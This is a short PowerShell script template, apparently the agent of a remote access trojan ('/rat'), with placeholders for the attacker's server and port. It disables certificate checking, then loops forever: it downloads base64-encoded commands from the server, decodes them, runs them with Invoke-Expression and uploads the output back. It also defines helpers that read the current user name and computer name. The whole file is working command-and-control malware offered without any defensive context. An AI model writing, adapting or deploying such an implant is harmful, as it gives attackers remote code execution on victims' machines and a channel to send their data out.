function getUser() {{
    $string = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Out-String
    $string = $string.Trim()
    return $string
}}
function getComputerName() {{
    $string = (Get-WmiObject Win32_OperatingSystem).CSName | Out-String
    $string = $string.Trim()
    return $string
}}
$resp = "http://{SERVER}:{PORT}/rat"
$w = New-Object Net.WebClient
while($true)
{{
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
$r_get = $w.DownloadString($resp)
$d = [System.Convert]::FromBase64String($r_get);
$Ds = [System.Text.Encoding]::UTF8.GetString($d);
while($r_get) {{
    $output = invoke-expression $Ds | out-string
    $w.UploadString($resp, $output)
    break
}}
}}